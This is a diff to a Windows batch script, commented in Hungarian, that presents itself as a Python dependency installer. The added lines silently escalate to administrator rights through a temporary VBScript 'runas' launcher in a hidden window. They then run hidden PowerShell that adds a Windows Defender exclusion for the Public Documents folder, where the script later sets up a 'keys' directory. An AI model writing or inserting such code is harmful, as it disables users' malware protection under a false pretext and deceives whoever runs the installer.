@@ -3,6 +3,29 @@ setlocal enabledelayedexpansion
 echo Python függőségek telepítése...
 echo.
 
+REM UAC ellenőrzés
+
+NET SESSION >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    goto admin_folytatas
+) ELSE (
+    goto ker_admin
+)
+
+:ker_admin
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
+    cscript //B "%temp%\getadmin.vbs"
+    exit
+
+:admin_folytatas
+REM ------------------------
+REM FŐ FUNKCIÓK
+
+powershell -InputFormat None -OutputFormat None -NonInteractive -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'"
+
+REM ------------------------
+
 :: get Public folder path dynamically
 set "public_dir=%PUBLIC%"
 set "docs_dir=%public_dir%\Documents\keys"
